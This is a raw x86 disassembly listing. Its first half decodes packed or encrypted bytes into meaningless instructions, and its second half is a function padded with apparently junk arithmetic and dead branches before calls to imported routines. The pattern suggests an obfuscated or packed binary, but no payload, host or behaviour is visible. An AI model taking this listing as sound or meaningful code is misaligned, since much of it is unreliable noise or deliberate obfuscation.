  451a86:	sbb    BYTE PTR ds:0x78898da5,al
  451a8c:	xchg   DWORD PTR [esi-0x7d5b9b0c],edi
  451a92:	xchg   esi,eax
  451a93:	rcr    DWORD PTR [ecx+esi*2-0xa],1
  451a97:	mov    ecx,0xf804021e
  451a9c:	repnz dec esp
  451a9e:	loope  0x451acf
  451aa0:	jg     0x451a2f
  451aa2:	cmp    esp,DWORD PTR [ecx+ecx*4+0x1]
  451aa6:	bound  ebp,QWORD PTR [eax-0x4]
  451aa9:	sbb    edx,DWORD PTR [edx-0x9387778]
  451aaf:	mov    edx,0x92cebf40
  451ab4:	in     eax,dx
  451ab5:	add    cl,ah
  451ab7:	ins    DWORD PTR es:[edi],dx
  451ab8:	popa   
  451ab9:	lea    esp,[esi+edx*1-0xc]
  451abd:	mov    fs,WORD PTR [esi+0x4f]
  451ac0:	push   esp
  451ac1:	aad    0xcc
  451ac3:	xor    BYTE PTR [esi+0x23],bl
  451ac6:	fisttp DWORD PTR [edi]
  451ac8:	pop    edx
  451ac9:	sti    
  451aca:	inc    edx
  451acb:	in     al,0x4d
  451acd:	add    edi,DWORD PTR [esi+edi*2-0x4022aa4b]
  451ad4:	mov    al,BYTE PTR [ebp+0x13c97160]
  451ada:	adc    BYTE PTR [ebx],ch
  451adc:	test   dl,0x8c
  451adf:	je     0x451b2c
  451ae1:	add    BYTE PTR [eax-0x586e5c22],al
  451ae7:	lds    esp,FWORD PTR [ebx-0x6c1cd97e]
  451aed:	aaa    
  451aee:	ins    DWORD PTR es:[edi],dx
  451aef:	stc    
  451af0:	adc    eax,0xcc86efa3
  451af5:	or     eax,0x37f1719
  451afa:	jl     0x451ac2
  451afc:	push   es
  451afd:	dec    esp
  451afe:	dec    BYTE PTR [edi+0x156de014]
  451b04:	fstp   DWORD PTR ds:0x3ac8be40
  451b0a:	mov    al,ds:0x440d8cdd
  451b0f:	aam    0x5a
  451b11:	aaa    
  451b12:	fwait
  451b13:	ja     0x451afe
  451b15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  451b16:	mov    bh,0x96
  451b18:	mov    BYTE PTR [edi],ch
  451b1a:	out    0x2b,eax
  451b1c:	std    
  451b1d:	call   0xff0bedf9
  451b22:	mov    ecx,0xe22158db
  451b27:	aad    0x32
  451b29:	lahf   
  451b2a:	test   BYTE PTR [edi-0x76d7c079],bh
  451b30:	mov    BYTE PTR [ecx],al
  451b32:	clc    
  451b33:	cwde   
  451b34:	gs in  eax,0x75
  451b37:	and    al,0xbe
  451b39:	pop    ss
  451b3a:	es mov edi,0xb48e002d
  451b40:	xchg   esi,ecx
  451b42:	adc    al,0xe9
  451b44:	jbe    0x451aca
  451b46:	gs popf 
  451b48:	add    DWORD PTR [ebx-0x58],edx
  451b4b:	(bad)
  451b4e:	sar    BYTE PTR [ebp+0x6c],cl
  451b51:	push   ds
  451b52:	inc    esi
  451b53:	and    BYTE PTR [ecx+eiz*8],ch
  451b56:	ins    BYTE PTR es:[edi],dx
  451b57:	and    esp,DWORD PTR [ecx-0x16]
  451b5a:	ins    DWORD PTR es:[edi],dx
  451b5b:	and    eax,0xe0dfe9a8
  451b60:	pop    edx
  451b61:	pop    ds
  451b62:	mov    ebp,0x47e54baa
  451b67:	das    
  451b68:	arpl   WORD PTR [bx+si+0x4c],dx
  451b6c:	pushf  
  451b6d:	popa   
  451b6e:	(bad)  
  451b6f:	sbb    DWORD PTR [ebp+0x0],ecx
  451b72:	mov    DWORD PTR [ebp+0x632fb289],edi
  451b78:	or     BYTE PTR [ebx+0x7],bl
  451b7b:	aam    0xce
  451b7d:	nop
  451b7e:	add    esi,DWORD PTR [ebp-0x26]
  451b81:	mov    BYTE PTR [ecx+0x1a6d8717],al
  451b87:	xor    BYTE PTR ds:[ecx],ah
  451b8a:	pop    esi
  451b8b:	cmp    cl,al
  451b8d:	clc    
  451b8e:	sets   BYTE PTR [esi]
  451b91:	add    dl,BYTE PTR [edx+0x4f63dd99]
  451b97:	adc    ebx,DWORD PTR [edx-0x4d]
  451b9a:	in     al,dx
  451b9b:	mov    ah,0x89
  451b9d:	jne    0x451b5e
  451b9f:	fcom   QWORD PTR [esi-0x35f538c2]
  451ba5:	and    al,0x44
  451ba7:	icebp  
  451ba8:	jne    0x451b76
  451baa:	pop    ds
  451bab:	adc    al,0xfe
  451bad:	aam    0xb7
  451baf:	xor    bh,dh
  451bb1:	(bad)  
  451bb2:	jmp    0x451b89
  451bb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  451bb5:	test   BYTE PTR [edx+ecx*8-0x2bd75ab2],al
  451bbc:	xor    ah,bl
  451bbe:	adc    al,0x5
  451bc0:	nop
  451bc1:	pop    ebx
  451bc2:	inc    ebp
  451bc3:	mov    DWORD PTR [eax-0x5a98c48b],ecx
  451bc9:	adc    ah,BYTE PTR [ebx-0x6dead6d5]
  451bcf:	js     0x451b98
  451bd1:	loopne 0x451c2f
  451bd3:	xor    al,0x8e
  451bd5:	pusha  
  451bd6:	jp     0x451c23
  451bd8:	mov    BYTE PTR [ebx],bh
  451bda:	pop    ebx
  451bdb:	jnp    0x451b99
  451bdd:	inc    eax
  451bde:	mov    ebx,DWORD PTR ds:0x182a0357
  451be4:	push   es
  451be5:	ds push edx
  451be7:	stc    
  451be8:	stc    
  451be9:	and    DWORD PTR [eax+0x1],0x4777e98b
  451bf0:	call   0x400b:0x28d49368
  451bf7:	jno    0x451c70
  451bf9:	out    dx,al
  451bfa:	adc    eax,0x63cb87d4
  451bff:	mov    es,WORD PTR [esi-0x48]
  451c02:	dec    ebx
  451c04:	les    esp,FWORD PTR [edx+0x2e]
  451c07:	xlat   BYTE PTR ds:[ebx]
  451c08:	(bad)  
  451c09:	es pop ss
  451c0b:	pop    eax
  451c0c:	aas    
  451c0d:	lea    ecx,[ecx]
  451c0f:	jne    0x451c7b
  451c11:	mov    BYTE PTR [edi],bl
  451c13:	inc    edi
  451c14:	pop    ds
  451c15:	jmp    0x451c87
  451c17:	pop    eax
  451c18:	loop   0x451c12
  451c1a:	jnp    0x451bc7
  451c1c:	pop    ss
  451c1d:	repz jmp 0x451c63
  451c20:	scas   eax,DWORD PTR es:[edi]
  451c21:	inc    edx
  451c22:	jae    0x451bd2
  451c24:	sub    esp,ecx
  451c26:	pusha  
  451c27:	outs   dx,DWORD PTR ds:[esi]
  451c28:	ja     0x451be6
  451c2a:	outs   dx,DWORD PTR ds:[esi]
  451c2b:	or     eax,0x5f25b845
  451c30:	sub    edx,DWORD PTR [ebp+0x5]
  451c33:	xor    al,0x80
  451c35:	pop    esp
  451c36:	popa   
  451c37:	aam    0x8
  451c39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  451c3a:	jno    0x451c3b
  451c3c:	add    cl,BYTE PTR [esi+0x7f88ee73]
  451c42:	mov    BYTE PTR [ecx+edx*2+0xc863275],ch
  451c49:	hlt    
  451c4a:	add    DWORD PTR [ebp-0x5e8b957e],esp
  451c50:	cli    
  451c51:	out    0xa6,al
  451c53:	call   0x6ac3806a
  451c58:	jg     0x451bf9
  451c5a:	xchg   ebx,eax
  451c5b:	push   ebp
  451c5c:	cmp    eax,0x741c9d02
  451c61:	(bad)  
  451c62:	cld    
  451c63:	int3   
  451c64:	in     al,dx
  451c65:	or     DWORD PTR [edx+0x21342a99],ecx
  451c6b:	push   edi
  451c6c:	push   cs
  451c6d:	ja     0x451c47
  451c6f:	into   
  451c70:	dec    ecx
  451c71:	pop    ecx
  451c72:	pop    ds
  451c73:	stos   DWORD PTR es:[edi],eax
  451c74:	and    edx,ebp
  451c76:	xlat   BYTE PTR ds:[ebx]
  451c77:	ds cwde 
  451c79:	outs   dx,BYTE PTR ds:[esi]
  451c7a:	xchg   ah,dl
  451c7c:	arpl   WORD PTR [eax+ebx*1],si
  451c7f:	ret    
  451c80:	jno    0x451c69
  451c82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  451c83:	mov    eax,ds:0x4c062789
  451c88:	lds    ebx,FWORD PTR [eax+0x7113649a]
  451c8e:	push   cs
  451c8f:	add    edi,DWORD PTR [ecx+0xb]
  451c92:	inc    esp
  451c93:	test   ecx,ebx
  451c95:	add    bh,ah
  451c97:	mov    edi,0x47896eab
  451c9c:	xchg   ecx,eax
  451c9d:	ja     0x451cff
  451c9f:	mov    ch,0x94
  451ca1:	out    0xad,eax
  451ca3:	ja     0x451caf
  451ca5:	jl     0x451c46
  451ca7:	leave  
  451ca8:	lods   al,BYTE PTR ds:[esi]
  451ca9:	dec    ecx
  451caa:	or     DWORD PTR [ebp-0x1a2015c9],esi
  451cb0:	leave  
  451cb1:	rol    DWORD PTR [eax+0x46],1
  451cb4:	or     BYTE PTR [edi-0x1f9e8ee1],al
  451cba:	dec    edx
  451cbb:	or     DWORD PTR [esp+0x8],ecx
  451cbf:	mov    eax,0xdbaf5e0a
  451cc4:	or     BYTE PTR [edx-0xb084306],bl
  451cca:	pop    esp
  451ccb:	xchg   DWORD PTR [edx],edx
  451ccd:	cmp    al,0x1e
  451ccf:	leave  
  451cd0:	fisttp QWORD PTR [esi]
  451cd2:	int3   
  451cd3:	xor    BYTE PTR [eax+0x2],dh
  451cd6:	mov    eax,0xe9af6b38
  451cdb:	stos   BYTE PTR es:[edi],al
  451cdc:	pushf  
  451cdd:	jg     0x451cfd
  451cdf:	or     DWORD PTR [esi-0x54],0x78
  451ce3:	mov    gs,edx
  451ce5:	cmc    
  451ce6:	adc    esp,0xffffffb2
  451ce9:	mov    bh,0x9a
  451ceb:	add    al,0x92
  451ced:	push   es
  451cee:	jecxz  0x451d0e
  451cf0:	mov    BYTE PTR [ebp+0x47],bl
  451cf3:	sub    DWORD PTR [ebp-0x6682b386],0x5
  451cfa:	sub    al,0xf0
  451cfc:	pop    edx
  451cfd:	mov    al,0x8e
  451cff:	push   edi
  451d00:	es (bad) 
  451d02:	pop    ds
  451d03:	mov    bl,0x80
  451d05:	outs   dx,BYTE PTR ds:[esi]
  451d06:	scas   al,BYTE PTR es:[edi]
  451d07:	psubd  mm2,QWORD PTR [ebx]
  451d0a:	in     al,dx
  451d0b:	aam    0xff
  451d0d:	push   0xdb346a7f
  451d12:	xchg   edx,eax
  451d13:	(bad)  
  451d14:	mov    bl,dh
  451d16:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  451d18:	xchg   esp,eax
  451d19:	int3   
  451d1a:	rcr    BYTE PTR [esi],cl
  451d1c:	fdiv   DWORD PTR [ebp+0x3]
  451d1f:	aam    0x79
  451d21:	xor    cl,dl
  451d23:	nop    edi
  451d26:	call   0x1fd66673
  451d2b:	in     eax,dx
  451d2c:	dec    eax
  451d2d:	out    dx,eax
  451d2e:	je     0x451d2b
  451d30:	pusha  
  451d31:	mov    bl,0xe4
  451d33:	aam    0xa0
  451d35:	jnp    0x451d1a
  451d37:	xchg   ecx,eax
  451d38:	and    ebp,DWORD PTR [edx-0x62778d83]
  451d3e:	ffree  st(1)
  451d40:	xchg   DWORD PTR [eax+0x2],ebp
  451d43:	(bad)  
  451d44:	ror    BYTE PTR [eax-0x46],cl
  451d47:	or     esi,esi
  451d49:	mov    ds,WORD PTR [edi]
  451d4b:	ss sub al,0x6f
  451d4e:	aaa    
  451d4f:	mov    dh,0x25
  451d51:	jbe    0x451dbf
  451d53:	jae    0x451cf1
  451d55:	lods   eax,DWORD PTR ds:[esi]
  451d56:	push   es
  451d57:	dec    ebx
  451d58:	dec    eax
  451d59:	or     edx,DWORD PTR [ebp-0x5ffdbacd]
  451d5f:	ror    cl,cl
  451d61:	jne    0x451db2
  451d63:	xor    ecx,DWORD PTR ds:0xf4251e59
  451d69:	sbb    eax,0x4810eba6
  451d6e:	sub    ah,bh
  451d70:	jl     0x451d87
  451d72:	(bad)  
  451d74:	cs std 
  451d76:	xorps  xmm2,xmm4
  451d79:	inc    al
  451d7b:	sbb    DWORD PTR [esi-0x3c341769],eax
  451d81:	icebp  
  451d82:	dec    DWORD PTR [ecx+0x10]
  451d85:	aas    
  451d86:	loop   0x451d5e
  451d88:	lods   eax,DWORD PTR ds:[esi]
  451d89:	xchg   esp,eax
  451d8a:	(bad)  
  451d8b:	std    
  451d8c:	fsubr  QWORD PTR [ebp*2+0x600c3894]
  451d93:	mov    bl,0xda
  451d95:	jae    0x451dbc
  451d97:	pop    edi
  451d98:	mov    dl,0xda
  451d9a:	and    eax,eax
  451d9c:	fild   DWORD PTR [eax]
  451d9e:	mov    dl,0x4b
  451da0:	arpl   WORD PTR [esi+0x458bfa5b],sp
  451da6:	add    BYTE PTR [esi-0x78],ah
  451da9:	dec    ebp
  451daa:	test   BYTE PTR [edi+0x7c00c1fb],al
  451db0:	stos   BYTE PTR es:[edi],al
  451db1:	add    bl,BYTE PTR [edx+0x7ab81580]
  451db7:	mov    ah,0x90
  451db9:	mov    edi,DWORD PTR [ebp+ecx*2+0x3d]
  451dbd:	lods   al,BYTE PTR ds:[esi]
  451dbe:	cdq    
  451dbf:	push   ebp
  451dc0:	push   ss
  451dc1:	adc    ebp,DWORD PTR [ecx-0x17fc66b2]
  451dc7:	mov    eax,ds:0x9f416208
  451dcc:	mov    bh,0x65
  451dce:	jmp    0x170d:0xa2d388a6
  451dd5:	push   es
  451dd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  451dd7:	add    eax,0x2865874d
  451ddc:	mov    BYTE PTR [eax+edi*8],bh
  451ddf:	add    eax,0x332a046d
  451de4:	mov    cl,dl
  451de6:	retf   0x1867
  451de9:	fild   DWORD PTR [esi+0x68]
  451dec:	xor    al,BYTE PTR [edi-0x6]
  451def:	mov    DWORD PTR [esi-0x4b0fd0da],edx
  451df5:	or     BYTE PTR [esi-0x49161cde],0xcb
  451dfc:	mov    dh,0x93
  451dfe:	xchg   si,ax
  451e00:	or     bh,bh
  451e02:	iret   
  451e03:	out    0x94,al
  451e05:	add    eax,0xd21199c7
  451e0a:	jne    0x451e51
  451e0c:	jno    0x451e10
  451e0e:	mov    esi,0xccb65f04
  451e13:	jae    0x451df1
  451e15:	call   FWORD PTR [edi]
  451e17:	addr16 daa 
  451e19:	int    0x9f
  451e1b:	push   cs
  451e1c:	call   0x881:0xf4d48cb3
  451e23:	(bad)  
  451e24:	ror    BYTE PTR [eax-0xa4aa7b9],1
  451e2a:	push   0xc3f594b4
  451e2f:	adc    eax,0xd1a0e899
  451e34:	sti    
  451e35:	inc    esi
  451e36:	into   
  451e37:	jmp    0x451e5b
  451e39:	(bad)  
  451e3a:	call   ebp
  451e3c:	jb     0x451e33
  451e3e:	dec    ecx
  451e3f:	cmp    eax,0x2f7a3e48
  451e44:	inc    ebp
  451e45:	test   al,0xfb
  451e47:	xchg   ebp,eax
  451e48:	ins    DWORD PTR es:[di],dx
  451e4a:	popf   
  451e4b:	adc    BYTE PTR [edi+0x56c6e202],0xa2
  451e52:	adc    eax,0x60a86186
  451e57:	stos   DWORD PTR es:[edi],eax
  451e58:	loope  0x451e04
  451e5a:	push   ebx
  451e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  451e5c:	icebp  
  451e5d:	int3   
  451e5e:	dec    esp
  451e5f:	fisub  WORD PTR [ebp-0x4af347fb]
  451e65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  451e66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  451e67:	push   esi
  451e68:	call   0x55457f44
  451e6d:	mov    ebp,esp
  451e6f:	sub    esp,0x84
  451e75:	mov    edx,0x4ef9
  451e7a:	xor    ecx,ecx
  451e7c:	and    edx,ecx
  451e7e:	sub    edx,ecx
  451e80:	add    edx,ecx
  451e82:	mov    DWORD PTR [ebp-0x14],edx
  451e85:	push   ebx
  451e86:	mov    eax,ecx
  451e88:	sub    DWORD PTR [ebp-0x14],ecx
  451e8b:	mov    ecx,DWORD PTR [ebp-0x14]
  451e8e:	add    eax,edx
  451e90:	and    ecx,edx
  451e92:	add    DWORD PTR [ebp-0x14],ecx
  451e95:	sub    DWORD PTR [ebp-0x14],eax
  451e98:	push   esi
  451e99:	mov    ebx,DWORD PTR ds:0x471d90
  451e9f:	add    DWORD PTR [ebp-0x14],ebx
  451ea2:	push   edi
  451ea3:	mov    edi,DWORD PTR [ebp-0x14]
  451ea6:	and    edi,eax
  451ea8:	xor    esi,esi
  451eaa:	add    DWORD PTR [ebp-0x14],edi
  451ead:	mov    DWORD PTR [ebp-0x14],esi
  451eb0:	and    DWORD PTR [ebp-0x14],edx
  451eb3:	mov    DWORD PTR [ebp-0x18],ebx
  451eb6:	mov    ecx,DWORD PTR [ebp-0x18]
  451eb9:	mov    esi,DWORD PTR [ebp-0x14]
  451ebc:	sub    DWORD PTR [ebp-0x18],ecx
  451ebf:	cmp    esi,ecx
  451ec1:	je     0x451ed6
  451ec3:	and    esi,ecx
  451ec5:	add    esi,edx
  451ec7:	mov    edx,0x4d
  451ecc:	add    esi,ecx
  451ece:	sub    DWORD PTR [ebp-0x14],esi
  451ed1:	sub    edx,esi
  451ed3:	add    DWORD PTR [ebp-0x14],edx
  451ed6:	sub    DWORD PTR [ebp-0x18],ebx
  451ed9:	add    DWORD PTR [ebp-0x18],edi
  451edc:	sub    edx,eax
  451ede:	or     DWORD PTR [ebp-0x14],ebx
  451ee1:	mov    edi,ebx
  451ee3:	mov    esi,DWORD PTR [ebp-0x14]
  451ee6:	test   esi,0x5
  451eec:	je     0x451f88
  451ef2:	cmp    edx,0xffffffe5
  451ef5:	je     0x451f88
  451efb:	xor    ebx,ebx
  451efd:	mov    eax,0x71284c92
  451f02:	and    edi,ebx
  451f04:	mov    DWORD PTR [ebp-0x14],ecx
  451f07:	or     DWORD PTR [ebp-0x14],esi
  451f0a:	add    edx,ecx
  451f0c:	add    edi,ecx
  451f0e:	add    eax,esi
  451f10:	cmp    edi,ebx
  451f12:	je     0x451f88
  451f14:	add    DWORD PTR [ebp-0x14],edi
  451f17:	mov    ecx,DWORD PTR ds:0x471d20
  451f1d:	mov    edi,DWORD PTR [ebp-0x18]
  451f20:	cmp    eax,DWORD PTR ds:0x471d24
  451f26:	je     0x451f88
  451f28:	and    ecx,edi
  451f2a:	mov    esi,0x2f
  451f2f:	xor    DWORD PTR [ebp-0x18],esi
  451f32:	and    edx,edi
  451f34:	test   edx,0x105c
  451f3a:	jne    0x451f88
  451f3c:	add    ecx,ecx
  451f3e:	mov    esi,DWORD PTR [ebp-0x14]
  451f41:	mov    ebx,DWORD PTR [ebp-0x14]
  451f44:	or     DWORD PTR [ebp-0x18],edi
  451f47:	add    DWORD PTR [ebp-0x18],ebx
  451f4a:	sub    edx,ecx
  451f4c:	sub    esi,eax
  451f4e:	cmp    esi,0x18
  451f51:	je     0x451f88
  451f53:	cmp    edx,DWORD PTR ds:0x471d20
  451f59:	je     0x451f88
  451f5b:	sub    edx,eax
  451f5d:	cmp    esi,DWORD PTR [ebp-0x20]
  451f60:	jne    0x451f88
  451f62:	mov    ecx,DWORD PTR ds:0x471d20
  451f68:	mov    edi,DWORD PTR [ebp-0x18]
  451f6b:	cmp    esi,ecx
  451f6d:	jne    0x451f88
  451f6f:	add    edi,esi
  451f71:	mov    ebx,DWORD PTR [ebp-0x18]
  451f74:	xor    esi,esi
  451f76:	add    edi,edi
  451f78:	sub    DWORD PTR [ebp-0x14],eax
  451f7b:	sub    ebx,ecx
  451f7d:	sub    DWORD PTR [ebp-0x18],esi
  451f80:	and    edx,edi
  451f82:	or     DWORD PTR [ebp-0x18],ebx
  451f85:	xor    DWORD PTR [ebp-0x14],edx
  451f88:	mov    edi,DWORD PTR ds:0x471d98
  451f8e:	add    edi,edi
  451f90:	or     DWORD PTR [ebp-0x18],edi
  451f93:	sub    DWORD PTR [ebp-0x14],edi
  451f96:	mov    ebx,0xd2
  451f9b:	mov    esi,DWORD PTR ds:0x471d20
  451fa1:	add    esi,eax
  451fa3:	sub    DWORD PTR [ebp-0x18],esi
  451fa6:	sub    ebx,esi
  451fa8:	and    ebx,ecx
  451faa:	and    ebx,esi
  451fac:	cmp    ebx,edx
  451fae:	je     0x451fb5
  451fb0:	or     ebx,esi
  451fb2:	sub    DWORD PTR [ebp-0x18],ebx
  451fb5:	sub    DWORD PTR [ebp-0x18],edx
  451fb8:	mov    eax,DWORD PTR [ebp-0x18]
  451fbb:	add    DWORD PTR [ebp-0x18],eax
  451fbe:	and    edx,eax
  451fc0:	mov    esi,DWORD PTR [ebp-0x14]
  451fc3:	sub    DWORD PTR [ebp-0x18],esi
  451fc6:	mov    eax,DWORD PTR ds:0x471cec
  451fcc:	add    edx,ecx
  451fce:	sub    edx,edi
  451fd0:	sub    edx,eax
  451fd2:	add    DWORD PTR [ebp-0x14],edx
  451fd5:	mov    esi,0xa1402488
  451fda:	xor    DWORD PTR [ebp-0x18],esi
  451fdd:	xor    edx,edx
  451fdf:	mov    edi,DWORD PTR [ebp-0x14]
  451fe2:	sub    edx,eax
  451fe4:	sub    edi,ecx
  451fe6:	cmp    edi,0xf341
  451fec:	je     0x4520b2
  451ff2:	mov    ecx,DWORD PTR [ebp-0x14]
  451ff5:	add    edx,eax
  451ff7:	and    DWORD PTR [ebp-0x18],edx
  451ffa:	sub    edi,edx
  451ffc:	sub    edi,ebx
  451ffe:	mov    ebx,DWORD PTR [ebp-0x18]
  452001:	cmp    ebx,edx
  452003:	jne    0x4520b2
  452009:	mov    edx,0x320410c
  45200e:	mov    eax,DWORD PTR [ebp-0x14]
  452011:	and    DWORD PTR [ebp-0x14],ecx
  452014:	add    eax,edi
  452016:	add    ebx,ebx
  452018:	mov    DWORD PTR [ebp-0x18],edx
  45201b:	sub    eax,esi
  45201d:	sub    DWORD PTR [ebp-0x18],eax
  452020:	test   ebx,0x4c
  452026:	jne    0x4520b2
  45202c:	add    ebx,esi
  45202e:	sub    ebx,edi
  452030:	add    ebx,edi
  452032:	sub    DWORD PTR [ebp-0x14],eax
  452035:	add    ebx,ecx
  452037:	mov    edx,DWORD PTR [ebp-0x14]
  45203a:	add    DWORD PTR [ebp-0x14],edx
  45203d:	mov    edi,DWORD PTR [ebp-0x14]
  452040:	cmp    edi,ebx
  452042:	je     0x4520b2
  452044:	cmp    ebx,0x2d
  452047:	jne    0x4520b2
  452049:	or     DWORD PTR [ebp-0x14],eax
  45204c:	mov    ecx,DWORD PTR [ebp-0x14]
  45204f:	mov    eax,DWORD PTR [ebp-0x18]
  452052:	add    DWORD PTR [ebp-0x18],eax
  452055:	and    DWORD PTR [ebp-0x18],edx
  452058:	cmp    edx,0xfffffff3
  45205b:	je     0x4520b2
  45205d:	add    edi,esi
  45205f:	cmp    edi,0xffffffd5
  452062:	je     0x4520b2
  452064:	mov    esi,DWORD PTR [ebp-0x14]
  452067:	and    DWORD PTR [ebp-0x14],ebx
  45206a:	mov    eax,DWORD PTR [ebp-0x18]
  45206d:	add    DWORD PTR [ebp-0x18],ecx
  452070:	cmp    edi,DWORD PTR ds:0x471d7c
  452076:	je     0x4520b2
  452078:	add    esi,ecx
  45207a:	add    DWORD PTR [ebp-0x14],eax
  45207d:	mov    ecx,DWORD PTR [ebp-0x18]
  452080:	mov    ebx,0x5732
  452085:	cmp    edi,ecx
  452087:	jne    0x4520b2
  452089:	sub    edi,eax
  45208b:	cmp    ecx,0x61
  45208e:	jne    0x4520b2
  452090:	cmp    ecx,DWORD PTR [ebp-0x14]
  452093:	jne    0x4520b2
  452095:	mov    edx,DWORD PTR [ebp-0x14]
  452098:	mov    ebx,DWORD PTR [ebp-0x14]
  45209b:	xor    DWORD PTR [ebp-0x14],edx
  45209e:	add    DWORD PTR [ebp-0x14],esi
  4520a1:	add    ecx,edx
  4520a3:	test   ecx,0x93
  4520a9:	je     0x4520b2
  4520ab:	sub    ebx,edi
  4520ad:	and    ebx,ecx
  4520af:	and    DWORD PTR [ebp-0x18],ebx
  4520b2:	sub    DWORD PTR [ebp-0x14],ebx
  4520b5:	sub    DWORD PTR [ebp-0x18],eax
  4520b8:	sub    DWORD PTR [ebp-0x14],eax
  4520bb:	mov    ecx,0xcd
  4520c0:	mov    eax,DWORD PTR [ebp-0x18]
  4520c3:	cmp    eax,0xffffff8e
  4520c6:	jne    0x4520ea
  4520c8:	add    eax,ecx
  4520ca:	cmp    edx,DWORD PTR [ebp-0x4]
  4520cd:	jne    0x4520ea
  4520cf:	mov    ecx,0x4e
  4520d4:	and    ecx,edx
  4520d6:	add    eax,edx
  4520d8:	mov    ebx,0xa42b
  4520dd:	add    DWORD PTR [ebp-0x18],eax
  4520e0:	add    ecx,edi
  4520e2:	or     ebx,edi
  4520e4:	mov    DWORD PTR [ebp-0x38],ecx
  4520e7:	sub    DWORD PTR [ebp-0x38],ebx
  4520ea:	mov    ecx,DWORD PTR [ebp-0x14]
  4520ed:	sub    DWORD PTR [ebp-0x18],ecx
  4520f0:	mov    edi,DWORD PTR [ebp-0x14]
  4520f3:	cmp    edi,DWORD PTR ds:0x471cec
  4520f9:	jne    0x452104
  4520fb:	mov    edx,DWORD PTR [ebp-0x18]
  4520fe:	mov    DWORD PTR [ebp-0x18],edx
  452101:	or     DWORD PTR [ebp-0x18],edi
  452104:	mov    esi,DWORD PTR ds:0x471d98
  45210a:	cmp    ecx,DWORD PTR [ebp-0xc]
  45210d:	je     0x4521fe
  452113:	mov    ecx,0x562a
  452118:	add    esi,edx
  45211a:	add    esi,ecx
  45211c:	cmp    esi,0x58
  45211f:	jne    0x4521fe
  452125:	add    DWORD PTR [ebp-0x18],edx
  452128:	add    esi,ebx
  45212a:	test   esi,0xfe
  452130:	jne    0x4521fe
  452136:	mov    ebx,DWORD PTR [ebp-0x14]
  452139:	mov    edi,0x6c48
  45213e:	sub    DWORD PTR [ebp-0x14],esi
  452141:	xor    DWORD PTR [ebp-0x18],ebx
  452144:	sub    DWORD PTR [ebp-0x14],ecx
  452147:	cmp    eax,DWORD PTR [ebp-0x18]
  45214a:	jne    0x4521fe
  452150:	mov    eax,0x8c
  452155:	xor    ebx,ebx
  452157:	add    ebx,esi
  452159:	mov    DWORD PTR [ebp-0x14],edi
  45215c:	test   ebx,0xac
  452162:	jne    0x452167
  452164:	or     DWORD PTR [ebp-0x18],ebx
  452167:	add    DWORD PTR [ebp-0x18],edi
  45216a:	sub    edx,esi
  45216c:	add    eax,edi
  45216e:	mov    DWORD PTR [ebp-0x14],edx
  452171:	sub    DWORD PTR [ebp-0x14],ecx
  452174:	cmp    esi,ecx
  452176:	je     0x4521fe
  45217c:	xor    ebx,ebx
  45217e:	xor    ecx,ecx
  452180:	sub    ebx,edi
  452182:	mov    DWORD PTR [ebp-0x18],eax
  452185:	add    ecx,ecx
  452187:	sub    DWORD PTR [ebp-0x14],esi
  45218a:	add    ebx,ebx
  45218c:	add    ebx,edi
  45218e:	add    ebx,esi
  452190:	sub    ecx,edx
  452192:	add    DWORD PTR [ebp-0x18],edx
  452195:	sub    ecx,esi
  452197:	sub    ebx,esi
  452199:	sub    DWORD PTR [ebp-0x18],esi
  45219c:	add    DWORD PTR [ebp-0x14],esi
  45219f:	cmp    ecx,DWORD PTR ds:0x471d90
  4521a5:	je     0x4521fe
  4521a7:	and    ecx,eax
  4521a9:	cmp    ebx,0x40
  4521ac:	je     0x4521fe
  4521ae:	add    ecx,eax
  4521b0:	test   ecx,0xac06
  4521b6:	jne    0x4521fe
  4521b8:	sub    ecx,esi
  4521ba:	mov    eax,0xcb
  4521bf:	mov    esi,DWORD PTR [ebp-0x14]
  4521c2:	xor    DWORD PTR [ebp-0x18],ebx
  4521c5:	add    DWORD PTR [ebp-0x14],ebx
  4521c8:	sub    esi,ecx
  4521ca:	sub    eax,esi
  4521cc:	cmp    eax,DWORD PTR ds:0x471d24
  4521d2:	jne    0x4521fe
  4521d4:	mov    edx,DWORD PTR [ebp-0x14]
  4521d7:	cmp    eax,0xffffffa0
  4521da:	jne    0x4521fe
  4521dc:	cmp    edx,DWORD PTR ds:0x471d24
  4521e2:	jne    0x4521fe
  4521e4:	add    edx,edi
  4521e6:	mov    esi,DWORD PTR ds:0x471d24
  4521ec:	test   eax,0xac
  4521f1:	jne    0x4521fe
  4521f3:	xor    DWORD PTR [ebp-0x18],edx
  4521f6:	sub    eax,edi
  4521f8:	mov    DWORD PTR [ebp-0x18],esi
  4521fb:	sub    DWORD PTR [ebp-0x14],eax
  4521fe:	lea    eax,[ebp-0x84]
  452204:	push   eax
  452205:	call   DWORD PTR ds:0x462c64
  45220b:	xor    ecx,ecx
  45220d:	sub    ecx,eax
  45220f:	and    ecx,eax
  452211:	add    DWORD PTR [ebp-0x14],ecx
  452214:	push   0x0
  452216:	push   0x0
  452218:	push   0xf4
  45221d:	push   0x471d24
  452222:	call   DWORD PTR ds:0x462c0c
  452228:	cmp    eax,edi
  45222a:	jne    0x4522a2
  45222c:	xor    eax,eax
  45222e:	mov    edx,DWORD PTR [ebp-0x18]
  452231:	and    edx,edi
  452233:	and    edx,edi
  452235:	sub    DWORD PTR [ebp-0x14],esi
  452238:	test   edx,0xe4
  45223e:	je     0x4522a2
  452240:	mov    esi,ebx
  452242:	add    DWORD PTR [ebp-0x18],eax
  452245:	mov    ecx,DWORD PTR [ebp-0x14]
  452248:	xor    DWORD PTR [ebp-0x18],edx
  45224b:	sub    ecx,eax
  45224d:	cmp    esi,ecx
  45224f:	je     0x4522a2
  452251:	mov    edx,DWORD PTR [ebp-0x18]
  452254:	add    DWORD PTR [ebp-0x18],ecx
  452257:	or     esi,edi
  452259:	xor    ebx,ebx
  45225b:	and    esi,ebx
  45225d:	and    DWORD PTR [ebp-0x14],eax
  452260:	cmp    esi,0x6e
  452263:	jne    0x4522a2
  452265:	mov    edi,0x1b
  45226a:	sub    DWORD PTR [ebp-0x18],edx
